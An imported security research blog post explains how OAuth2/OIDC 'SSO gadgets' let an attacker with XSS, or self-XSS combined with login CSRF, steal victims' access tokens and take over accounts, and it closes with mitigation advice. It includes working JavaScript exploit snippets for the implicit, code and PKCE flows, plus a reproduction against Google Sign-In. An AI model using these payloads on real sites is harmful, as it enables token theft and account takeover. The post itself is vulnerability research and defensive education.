---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-04_sso-gadgets-escalate-self-xss-to-ato.md
original_filename: 2023-02-04_sso-gadgets-escalate-self-xss-to-ato.md
title: 'SSO Gadgets: Escalate (Self-)XSS to ATO'
category: documents
detected_topics:
- oauth
- sso
- jwt
- xss
- csrf
- access-control
tags:
- imported
- documents
- oauth
- sso
- jwt
- xss
- csrf
- access-control
language: en
raw_sha256: 9de7ea6aeb4dab8b1495d9eec940348182b6b7fbc39c5768626217a674c0ad04
text_sha256: 22b1b731713d335f8d9c4490f7477f87fdabc3b3af8dd4562099a69cb346b273
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# SSO Gadgets: Escalate (Self-)XSS to ATO

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-04_sso-gadgets-escalate-self-xss-to-ato.md
- Source Type: markdown
- Detected Topics: oauth, sso, jwt, xss, csrf, access-control
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `9de7ea6aeb4dab8b1495d9eec940348182b6b7fbc39c5768626217a674c0ad04`
- Text SHA256: `22b1b731713d335f8d9c4490f7477f87fdabc3b3af8dd4562099a69cb346b273`


## Content

---
title: "SSO Gadgets: Escalate (Self-)XSS to ATO"
page_title: "(Web-)Insecurity Blog | SSO Gadgets: Escalate (Self-)XSS to ATO"
url: "https://security.lauritz-holtmann.de/post/xss-ato-gadgets/"
final_url: "https://security.lauritz-holtmann.de/post/xss-ato-gadgets/"
authors: ["Lauritz Holtmann (@_lauritz_)"]
bugs: ["SSO", "OAuth", "Account takeover", "Self-XSS", "Login CSRF"]
publication_date: "2023-02-04"
added_date: "2023-02-07"
source: "pentester.land/writeups.json"
original_index: 1578
---

POSTS February 4, 2023 15 min read 3108 words

With the rise of _Single-Sign-On_ (SSO) and especially _OAuth 2.0_ and _OpenID Connect (OIDC)_ , the attack surface of web applications has increased significantly. In this post, I will show how to escalate a Cross-Site Scripting (XSS) vulnerability to an Account Takeover (ATO) by abusing OAuth2/OIDC gadgets and how to prevent such attacks.

XSS is a powerful attack, as it allows an attacker to execute arbitrary JavaScript code on the victim’s browser. While this enables the attacker to perform actions within the application on behalf of the victim user, in a perfect world, the attacker would not be able to completely take over a user’s account. In this post, I will discuss that it is still possible in many cases to escalate an XSS vulnerability to an _Account Takeover_ (ATO) by abusing OAuth2/OIDC gadgets. Under certain conditions, SSO gadgets can even allow the escalation of allegedly harmless vulnerabilities such as _Self-XSS_ (combined with _Login CSRF_) to an ATO.

To formalize the term “ _account takeover_ ”, we define that the attacker’s objective is to obtain a victim’s `access_token` (+ an associated `id_token` in case of _OIDC_) and to use it to log into the victim’s account. To simplify the used examples, we will focus on the `access_token`, because in most cases the `id_token` can be obtained using the same gadget.

* * *

## Table of Contents

  1. Fundamentals
  1. OAuth2/OIDC
  1. Public vs. Confidential Client
  2. Protocol Flow(s)
  2. SSO Gadgets
  1. Client Configuration supports Implicit Flow
  2. Confidential Client, OAuth with Code Flow (no PKCE)
  3. SPA with Code Flow + PKCE
  3. Real World Examples
  1. Self-XSS + Login CSRF + SSO Gadget = ATO
  2. Google SSO: Broadly Accessibly SSO Gadget
  4. Mitigation
  5. Conclusion

* * *

## Fundamentals

If you are familiar with _OAuth2/OIDC_, _public/confidential clients_, and the associated _protocol flows_ feel free to skip this section.

### OAuth2/OIDC

As of 2023, _OAuth 2.0_ (delegated authorization) and _OIDC_ (additional authentication layer) are the de-facto standards that are used to implement SSO logins in modern websites. They are for instance used by [“Sign in with Google”](https://developers.google.com/identity/gsi/web/guides/overview), [“Sign in with Facebook”](https://developers.facebook.com/docs/facebook-login/guides/advanced/manual-flow) and [“Sign in with Apple”](https://developer.apple.com/sign-in-with-apple/). In this context, Apple, Facebook, and Google are also often referred to as “ _Identity Providers_ ” (IdPs) or “ _Login Providers_ ”.

In this section, I will outline some of the most important concepts of OAuth2/OIDC for this post. For a more detailed explanation, I recommend having a look at the specification documents for [OAuth2](https://tools.ietf.org/html/rfc6749) and [OIDC](https://openid.net/specs/openid-connect-core-1_0.html).

Formally, there is a clear distinction between **authorization** (_OAuth2_) and **authentication** (_OIDC_):

  * **Authorization** : The bearer `access_token` is used to authorize actions on behalf of the user. This is the main purpose of _OAuth2_.
  * **Authentication** : The “ _identity layer on top of the OAuth 2.0_ ”1 introduced with _OIDC_ allows the authentication of a user. Technically, _OIDC_ mainly introduced a _JSON Web Token_ (JWT)2 called `id_token` which contains the user’s identity information (e.g. name, email, etc.).

However, in practice, they are often used together, and to take over an account, it is sufficient to obtain the `access_token` of a victim user. In this post, I will use the term _OAuth2/OIDC_ to refer to both protocols.

#### Public vs. Confidential Client

In terms of OAuth2/OIDC, a _Client_ is an entity that is granted permission to access a user’s resources (_authorization_) or authenticates a user (_authentication_). In the context of SSO, a _Client_ is usually a web application. In general, there are two types of clients3:

  1. **Public Clients** : This includes all clients which are not able to keep a secret, such as a web browser app or a mobile app.
  2. **Confidential Clients** : This includes all clients which can keep a secret, such as a web server.

_Confidential Clients_ use an additional `client_secret` to authenticate themselves to the IdP. This secret is used during the _Token Request_ to redeem an `authorization_code` for an `access_token` and is not sent to the user agent. From an attacker’s perspective, this means that the attacker cannot directly obtain an `access_token` for a victim user’s `code` value, as the attacker does not know the `client_secret`. This is the reason why _Confidential Clients_ are considered more secure than _Public Clients_.

#### Protocol Flow(s)

As of 2023, it is recommended to use the _authorization code flow_ with _PKCE_ for all OAuth flows4 to authorize entities or authenticate users.

An exemplary flow for a _Confidential Client_ could look like this:

![Authorization Code Flow](/images/advisories/code_flow_pkce.svg)

Besides this flow, there is also the less-secure _implicit flow_ , which is deprecated and will be dropped in OAuth 2.15. The flow is described in detail in the [OAuth2 specification](https://tools.ietf.org/html/rfc6749#section-4.2). The core difference to the previously described flow is that the `access_token` is returned directly to the client, instead of being exchanged for an `authorization_code` first. This means that the `access_token` is directly exposed to the user agent and can be obtained by an attacker.

![Implicit Flow](/images/advisories/implicit_flow.svg)

## SSO Gadgets

 _SSO Gadgets_ are OAuth2/OIDC behaviors that may not be intended to be used by the application but can be abused by an attacker to obtain an `access_token` or `id_token` for the victim user. The following sections describe common SSO Gadgets and how they could be chained to escalate an XSS vulnerability to an ATO.

All _SSO Gadgets_ covered in this post have the following:

  1. The victim user has an active session at the IdP.
  2. The victim user granted consent for the vulnerable application.
  3. The IdP supports the `prompt=none` auth. request parameter6.

* * *

### Case 1: Client Configuration supports Implicit Flow (despite the Client using Code Flow with PKCE normally)

In this scenario, we are dealing with a client which uses the _authorization code flow_ with _PKCE_ to authenticate the user. Even though the flow that is used by the application follows the current best practice, the client configuration also allows using the _implicit flow_ (which is not recommended anymore and will be dropped in OAuth 2.15).

**A malicious actor can then abuse the _implicit flow_ to directly obtain an `access_token` for the victim user.**

An exemplary JavaScript snippet that utilizes the _implicit flow_ to obtain an `access_token` is shown below. The attacker can use this snippet to obtain an `access_token` for the victim user:
  
  
  // Perform implicit auth, consent, and active session required
  let exploitWindow = window.open(
  "https://www.idp.com/authorize?client_id=example-client-id&state=aaaaaaaaa&response_type=token&scope=openid&redirect_uri=https%3A%2F%2Fvictim.com&prompt=none",
  "example",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  // Obtain access_token 
  // Access to exploitWindow.window.location is only possible from same origin of window
  setTimeout(function(){
  alert(exploitWindow.window.location);
  exploitWindow.close()
  },5000);
  

Please note that we assume that the application does not support the _implicit flow_ and the login flow “breaks”. The victim user ends up on the `redirect_uri` of the application, which is not able to handle the `access_token` value. The attacker can then use the above snippet to obtain the `access_token` value from the window’s URL and perform an “ _Access Token Injection_ ”7 attack.

In detail, the above snippet performs the following steps:

  1. Open a new window with the _implicit flow_ URL.
  2. Wait for 5 seconds until the SSO flow is completed and the URL of the `exploitWindow` holds the sensitive `access_token` value.
  3. Close the window and display the URL of the window. The URL contains the `access_token` value.

Please also note that it is only possible to access the `exploitWindow.window.location` from the same origin as the `exploitWindow` itself. This is why the attacker needs to host the exploit on the same domain as the `exploitWindow`, i.e. they need to have XSS to directly utilize this gadget.

Some applications redirect the user in the case of an error during authentication. As the `access_token` value may be removed from the URL in this process, a slightly modified version of the above snippet can be used to obtain the `access_token` value from the `exploitWindow` before the redirect occurs:
  
  
  // As there is a redirect if parameters are missing on Auth Response, 
  // we need to loop over the exploitWindow and try to regularly obtain the token until we succeed
  function tryToObtainToken() {
  setTimeout(function () {
  try {
  let test = exploitWindow.window.location;
  if(test.toString()!="about:blank") { 
  alert(test);
  exploitWindow.close()
  return; // end loop
  }
  } catch (error) {
  console.log(error);
  }
  tryToObtainToken(); // loop
  }, 100);
  }
  
  /**********************************************************************************/
  
  // Perform implicit auth, consent, and active session required
  exploitWindow = window.open(
  "https://www.idp.com/authorize?client_id=example-client-id&state=aaaaaaaaa&response_type=token&scope=openid&redirect_uri=https%3A%2F%2Fvictim.com&prompt=none&response_mode=fragment",
  "example",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  // Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window though
  tryToObtainToken();
  

### Case 2: Confidential Client, OAuth with Code Flow (no PKCE)

In this scenario, we are dealing with a _confidential client_ which uses the _authorization code flow_ **without PKCE** to authenticate the user. Further, the client configuration does not allow to use the _implicit flow_. Still, a malicious actor can use the _authorization code flow_ to obtain an `access_token` for the victim user as follows:

  1. The attacker injects a malicious JavaScript snippet into the vulnerable application, just like they did in the previous case. The key difference is, that the `code` must not be redeemed by the application before the attacker can send it to their server and then use it to obtain an `access_token` on their own. This can for instance be achieved by using an invalid `state` value or a `response_mode=fragment` parameter if supported by the IdP. [Frans Rosén](https://twitter.com/fransrosen) wrote a great blog post about this topic and introduced the term “Non-Happy” paths for this8.

  
  
  // Perform code flow, consent, and active session required
  let exploitWindow = window.open(
  "https://www.idp.com/authorize?client_id=example-client-id&state=aaaaaaaaa&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fvictim.com&prompt=none&response_mode=fragment",
  "example",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  // Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window though
  setTimeout(function(){
  alert(exploitWindow.window.location);
  exploitWindow.close()
  },5000);
  

  2. After obtaining the victim’s `code` value, the malicious actor starts a fresh login flow at the application. During this login flow, they swap the `code` value with the victim’s `code` value:

![Code Leak Attack Flow](/images/advisories/code_leak_attack_flow.svg)

  3. The attacker is authenticated as the victim user.

This attack is also referred to as the “ _Authorization Code Injection_ ” attack9. If you want to learn more about this attack, please have a look at the [_OAuth 2.0 Security Best Current Practice_](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics).

### Case 3: SPA with Code Flow + PKCE

In this scenario, we are dealing with a _public client_ which uses the _authorization code flow_ **with PKCE** to authenticate the user. Further, the client configuration does not allow to use of the _implicit flow_. It should be noted that XSS in the case of a SPA that serves as a _public client_ is known to allow “ _full compromise the application_ ”10.

A malicious actor can use the _authorization code flow_ to obtain an `access_token` for the victim user as follows:

  1. Inject JavaScript into the application’s origin.
  2. Compute `code_verifier` and `code_challenge` as described in [RFC 7636](https://tools.ietf.org/html/rfc7636).
  3. Use JavaScript to open a new window with the _authorization code flow_ URL including the chosen PKCE values.
  4. Wait for the `code` value to be present in the URL of the new window.
  5. Obtain the `code` value from the URL of the window and then close the window.
  6. Issue a POST request to the token endpoint of the IdP with the `code` value and the `code_verifier` value to obtain the victim user’s `access_token`.

  
  
  // Perform implicit auth, consent, and active session required
  let exploitWindow = window.open(
  "https://www.idp.com/authorize?client_id=example-client-id&state=aaaaaaaaa&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fvictim.com&prompt=none&response_mode=fragment&code_challenge=gfMmh9Zig74zi0NGMbjxM0tvS8qXTC13-mJ9LipFxYU&code_challenge_method=S256",
  "example",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  function redeemCode(code) {
  fetch("https://www.idp.com/token", {
  method: 'POST', 
  mode: 'cors',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: `client_id=example-client-id&redirect_uri=https%3A%2F%2Fvictim.com&grant_type=authorization_code&code_verifier=this-is-just-a-test-that-needs-to-be-strong-enough&code=${code}`
  }).then((response) => response.json()).then((data) => alert(data.access_token));
  }
  
  // Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window though
  setTimeout(function(){
  let code = new URLSearchParams(exploitWindow.window.location.hash.substring(1)).get('code');
  exploitWindow.close();
  redeemCode(code);
  }, 5000);
  

In case the IdP does not return an optional long-living `refresh_token` value by default, a malicious actor can try to explicitly request a `refresh_token` value by adding the `offline_access` scope to the authorization request11. If the IdP responds with a `refresh_token`, this value can then be used to obtain a fresh `access_token` value at a later point in time.

_Please note: This gadget only works because we are dealing with a public client. If we were dealing with a confidential client, the attacker would not be able to directly issue the - otherwise required -`client_secret` to the token endpoint._

* * *

## Real World Examples

As we already have discussed the fundamentals and outlined the general idea of SSO Gadgets, we can now look at some real-world examples. The following sections describe real-world examples of SSO Gadgets and how they could be chained to escalate an XSS vulnerability to an ATO.

### Ex. 1: Self XSS + Login CSRF + SSO Gadget = ATO

This vulnerability chain (in slightly different variants) was identified in the context of multiple private Bug Bounty programs. I therefore cannot disclose the details of the vulnerabilities. However, I can describe the general idea of the vulnerabilities and how they could be chained to escalate a Self-XSS vulnerability to an ATO.

#### Login CSRF into Attacker’s Account

The very first aspect of the exploit chain was a _Login CSRF_ vulnerability which enabled an attacker to log in a user into the attacker’s account. Especially in the context of SSO implementations, _Login CSRF_ vulnerabilities are quite common. Still, as many Bug Bounty programs tend to exclude this type of _CSRF_ from their scope, researchers do not seem to pay much attention to this type of vulnerability.

There are multiple common patterns of _Login CSRF_ vulnerabilities, for instance:

  1. Login form without Anti-CSRF token.
  2. Missing CSRF protection in _OAuth2/OIDC_ flow: Weak or no `state` value, no PKCE12.
  3. Custom redirect to the main application including session information or token as GET parameter on login:

  
  
  GET /token-login?google_token=eyJ[...] HTTP/1.1
  Host: victim.com
  [...]
  

#### Self-XSS within Username

The second aspect of the exploit chain was a _Self-XSS_ vulnerability within the username. This vulnerability could be used to inject a malicious JavaScript snippet into the victim user’s browser. As this was a Self-XSS, normally users could only “attack” themselves using this vulnerability. Even chained with the mentioned Login CSRF vulnerability, this would not have a significant impact, as the attacker would be only able to perform actions within the attacker account’s session at the target application.

#### SSO Gadget

The third aspect of the exploit chain was the _SSO Gadget_. Even though the victim user would not be logged in within the target application after executing the _Login CSRF_ , they would still have an active session at the _Login Provider_.  
Consequently, an SSO gadget could be used to directly obtain the victim user’s `access_token` from the Login Provider. This `access_token` could then be used to perform actions within the target application on behalf of the victim user or to directly access restricted APIs on behalf of the victim user.

The full attack chain could be executed as follows:

  1. Prepare an attacker account with JavaScript payload within the user name.
  2. Login the victim user into the attacker account using the Login CSRF vulnerability.
  3. Redirect the victim user to the target application.
  4. Execute the JavaScript payload within the victim user’s browser.
  5. Use the SSO Gadget to obtain the victim user’s `access_token`.
  6. Use the `access_token` to perform actions within the target application on behalf of the victim user.

* * *

### Ex. 2: Google SSO: Broadly Accessibly SSO Gadget

Google is a _very_ common Login Provider. As of January 2023, it is not possible to disable the _implicit flow_ [in Google’s OAuth 2.0 configuration](https://console.cloud.google.com/apis/credentials) for clients with the type “web-application”. This means that many web application which use Google as a Login Provider are vulnerable to the first SSO Gadget. In fact, that the _implicit flow_ cannot be disabled, was already noted in StackOverflow questions years ago13.

Furthermore, as Google supports the `prompt=none` parameter, it is directly possible to utilize the first SSO gadget introduced in this post against many web applications that support _Google Sign-In_.

Steps to reproduce:

  1. Browse [this link](https://accounts.google.com/o/oauth2/v2/auth?client_id=1085360721064-dhd33gk78mmbmrukkgjm3384v8fmte4o.apps.googleusercontent.com&redirect_uri=https://lhq.at&state=a&response_type=token&scope=openid&prompt=consent) and grant initial consent.

  2. Browse [lhq.at](https://lhq.at) and execute the following JavaScript code in the developer console (to simulate XSS):

  
  
  // Perform implicit auth, consent, and active session required
  let exploitWindow = window.open(
  "https://accounts.google.com/o/oauth2/v2/auth?client_id=1085360721064-dhd33gk78mmbmrukkgjm3384v8fmte4o.apps.googleusercontent.com&redirect_uri=https://lhq.at&state=a&response_type=token&scope=openid&prompt=none",
  "a",
  "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
  );
  
  // Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window
  setTimeout(function(){
  alert(exploitWindow.window.location);
  exploitWindow.close();
  },2000);
  

  3. Observe that there is an `alert()` prompt that includes the complete URL of the `exploitWindow`. This URL includes the `access_token` which can be used to perform actions on behalf of the victim user.

![Google SSO Gadget](/images/advisories/xss-sso-google-gadget.png)

This issue was reported to Google in December 202214. However, as of February 2023, the issue is still not fixed.

* * *

## Mitigation

To define a thorough mitigation strategy, we need to understand the underlying mechanisms of SSO Gadgets. As we have seen in the previous sections, SSO Gadgets rely on the possibility to obtain an `access_token` from the Login Provider from within the application’s origin.

Consequently, the following mitigation strategies should be considered

  1. Use the _code flow_ with _PKCE_ for all clients, as it is also recommended by the OAuth 2.0 Best Current Practice4 and the OAuth 2.1 specification draft5.
  2. Disable all unused protocol flows (e.g. `response_type=token` for the implicit flow).
  3. Carefully evaluate the support of the `prompt=none` parameter. If feasible, disable it.
  4. Follow the [OAuth 2.0 current practice for Browser-Based Apps](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps). Especially for Single Page Applications (SPAs), there are design patterns that can prevent direct access to the `access_token` from within the application’s origin (e.g. by using a [Token Mediating Backend](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#section-6.3) or by [Acquiring tokens from a Service Worker](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#name-acquiring-tokens-from-a-ser)).

Slightly unrelated to SSO Gadgets, but still noteworthy in this context: In case your application implements SSO capabilities, you should carefully evaluate whether you _really_ want to exclude _Open Redirects_ , _Login CSRF_ , and _Self-XSS_ from your security scope (and resulting _Bug Bounty Policies_).

## Conclusion

In this post, I have discussed the concept of SSO Gadgets and how they can be used to escalate an XSS vulnerability to an ATO. I have also discussed some real-world examples of SSO Gadgets and outlined some mitigation strategies to prevent SSO Gadgets from being used to escalate an XSS vulnerability to an ATO.

Hopefully, this raises awareness about the potential impact of erroneous SSO configurations and the importance of properly implementing OAuth/OIDC. Further, I hope that this post will help developers to better understand the potential of allegedly “harmless” vulnerabilities such as Self-XSS and Login CSRF in the context of SSO implementations.

* * *

Thank you for reading this post! If you have any feedback, feel free to reach out via [Mastodon](https://ruhr.social/@lauritz), [Twitter](https://twitter.com/_lauritz_) or [LinkedIn](https://linkedin.com/in/lauritz-holtmann). 👨‍💻

I would like to thank [Louis Jannett](https://twitter.com/iphoneintosh) for his help in reviewing this post. 🙏

You can directly tweet about this post using [this link](https://twitter.com/intent/tweet?url=https%3A%2F%2Fsecurity.lauritz-holtmann.de%2Fpost%2Fxss-ato-gadgets%2F&via=_lauritz_). 🤓

* * *

  1. [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html) ↩︎

  2. [RFC7519: JSON Web Token (JWT)](https://www.rfc-editor.org/rfc/rfc7519) ↩︎

  3. [RFC6749: The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749) ↩︎

  4. [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) ↩︎ ↩︎

  5. [oauth.net: Summary of changes introduced with OAuth 2.1](https://oauth.net/2.1/) ↩︎ ↩︎ ↩︎

  6. [OpenID Connect Core 1.0: Authentication Request](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest) ↩︎

  7. [OAuth 2.0 Security Best Current Practice: Access Token Injection](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-access-token-injection) ↩︎

  8. [Frans Rosén: Account hijacking using “dirty dancing” in sign-in OAuth-flows](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#non-happy-paths-in-the-oauth-dance) ↩︎

  9. [OAuth 2.0 Security Best Current Practice: Authorization Code Injection](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-authorization-code-injectio) ↩︎

  10. [OAuth 2.0 for Browser-Based Apps](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps) ↩︎

  11. [OpenID Connect Core 1.0: Offline Access](https://openid.net/specs/openid-connect-core-1_0.html#OfflineAccess) ↩︎

  12. [OAuth 2.0 Security Best Current Practice: Protecting Redirect-Based Flows](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.1) ↩︎

  13. [StackOverflow: Disabling implicit flow for Google OAuth (Web Server applications)?](https://stackoverflow.com/questions/46402365/disabling-implicit-flow-for-google-oauth-web-server-applications) ↩︎

  14. [Google SSO exposes Relying Parties to an ATO Gadget by do not allowing developers to disable the OAuth 2.0 Implicit Flow.](https://issuetracker.google.com/issues/261555427) ↩︎

  * [Cross-Site Scripting](/tags/cross-site-scripting)
  * [SSO](/tags/sso)
  * [OIDC](/tags/oidc)
  * [OpenID Connect](/tags/openid-connect)
  * [OAuth](/tags/oauth)
